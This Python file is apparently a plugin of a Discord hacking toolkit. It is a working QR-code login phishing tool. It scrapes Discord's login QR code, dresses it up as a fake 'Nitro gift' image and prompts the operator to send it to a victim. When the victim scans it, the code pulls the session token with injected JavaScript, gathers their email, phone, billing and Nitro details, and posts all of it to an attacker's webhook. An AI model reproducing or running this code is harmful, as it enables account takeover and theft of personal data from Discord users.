import requests
import os
import sys
import json
import base64
import Gloom

from PIL import Image
from zipfile import ZipFile
from time import sleep
from urllib.request import urlretrieve
from selenium import webdriver
from bs4 import BeautifulSoup
from colorama import Fore

from func.plugins.common import getDriver, getheaders

def logo_qr():
    #Paste the discord logo onto the QR code
    im1 = Image.open('QR-Code/temp_qr_code.png', 'r')
    im2 = Image.open('QR-Code/overlay.png', 'r')
    im1.paste(im2, (60, 55), im2)
    im1.save('QR-Code/Qr_Code.png', quality=95)

def paste_template():
    #paste the finished QR code onto the nitro template
    im1 = Image.open('QR-Code/template.png', 'r')
    im2 = Image.open('QR-Code/Qr_Code.png', 'r')
    im1.paste(im2, (120, 409))
    im1.save('QR-Code/discord_gift.png', quality=95)

def QR_Grabber(Webhook):
    type_ = getDriver()

    if type_ == "chromedriver.exe":
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        driver = webdriver.Chrome(options=opts)
    # elif type_ == "operadriver.exe":
    #     opts = webdriver.opera.options.ChromeOptions()
    #     opts.add_experimental_option('excludeSwitches', ['enable-logging'])
    #     opts.add_experimental_option("detach", True)
    #     driver = webdriver.Opera(options=opts)
    elif type_ == "msedgedriver.exe":
        opts = webdriver.EdgeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        driver = webdriver.Edge(options=opts)
    else:
        print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Coudln\'t find a driver to create a QR code with')
        sleep(3)
        print("Enter anything to continue. . . ", end="")
        input()
        Gloom.main()

    driver.get('https://discord.com/login') #get discord url so we can log the token
    sleep(3)

    page_source = driver.page_source
    soup = BeautifulSoup(page_source, features='html.parser')

    #Create the QR code
    div = soup.find('div', {'class': 'qrCode-2R7t9S'})
    qr_code = div.find('img')['src']
    file = os.path.join(os.getcwd(), 'QR-Code/temp_qr_code.png')

    img_data = base64.b64decode(qr_code.replace('data:image/png;base64,', ''))

    print(f"\n{Fore.WHITE}Downloading templates for QR code")

    # Download qr code templates
    urlretrieve(
        "https://github.com/TT-Tutorials/addons/blob/main/QR-Code.zip?raw=true",
        filename="QR-Code.zip",
    )
    with ZipFile("QR-Code.zip", 'r')as zip2:
        zip2.extractall()
    os.remove("QR-Code.zip")

    with open(file,'wb') as handler:
        handler.write(img_data)

    discord_login = driver.current_url
    logo_qr()
    paste_template()

    #remove the templates
    os.remove(os.getcwd()+"\\QR-Code\\overlay.png")
    os.remove(os.getcwd()+"\\QR-Code\\template.png")
    os.remove(os.getcwd()+"\\QR-Code\\temp_qr_code.png")

    print(f'\nQR Code generated in '+os.getcwd()+"\\QR-Code")
    print(f'\n{Fore.RED}Make sure to have this window open to grab their token!{Fore.RESET}')
    print(f'{Fore.MAGENTA}Send the QR Code to a user and wait for them to scan!{Fore.RESET}')
    os.system(f'start {os.path.realpath(os.getcwd()+"/QR-Code")}')
    if sys.argv[0].endswith(".exe"):
        try:
            os.startfile(sys.argv[0])
        except Exception:
            pass

    #Waiting for them to scan QR code
    while True:
        if discord_login != driver.current_url:
            token = driver.execute_script('''
    token = (webpackChunkdiscord_app.push([
        [''],
        {},
        e=>{m=[];for(
                let c in e.c)
                m.push(e.c[c])}
        ]),m)
        .find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
    return token;
                ''')
            j = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)).json()
            badges = ""
            flags = j['flags']
            if (flags == 1): badges += "Staff, "
            if (flags == 2): badges += "Partner, "
            if (flags == 4): badges += "Hypesquad Event, "
            if (flags == 8): badges += "Green Bughunter, "
            if (flags == 64): badges += "Hypesquad Bravery, "
            if (flags == 128): badges += "HypeSquad Brillance, "
            if (flags == 256): badges += "HypeSquad Balance, "
            if (flags == 512): badges += "Early Supporter, "
            if (flags == 16384): badges += "Gold BugHunter, "
            if (flags == 131072): badges += "Verified Bot Developer, "
            if (badges == ""): badges = "None"

            user = j["username"] + "#" + str(j["discriminator"])
            email = j["email"]
            phone = j["phone"] if j["phone"] else "No Phone Number attached"

            url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
            try:
                requests.get(url)
            except:
                url = url[:-4]
            nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token)).text)) > 0)

            embed = {
                "avatar_url":"https://cdn.discordapp.com/attachments/991096084774412289/1048980793134944266/Untitled3_20221203213929.png",
                "embeds": [
                    {
                        "author": {
                            "name": "QR Gloomify",
                            "url": "https://github.com/crxel",
                            "icon_url": "https://cdn.discordapp.com/attachments/991096084774412289/1048980793134944266/Untitled3_20221203213929.png"
                        },
                        "description": f"**{user}** scanned the QR code\n\n**Has Billing:** {billing}\n**Nitro:** {has_nitro}\n**Badges:** {badges}\n**Email:** {email}\n**Phone:** {phone}\n**[Avatar]({url})**",
                        "fields": [
                            {
                              "name": "**Token**",
                              "value": f"```fix\n{token}```",
                              "inline": False
                            }
                        ],
                        "color": 139,

                        "footer": {
                          "text": "github.com/crxel"
                        }
                    }
                ]
            }
            requests.post(Webhook, json=embed)
            break
    os._exit(0)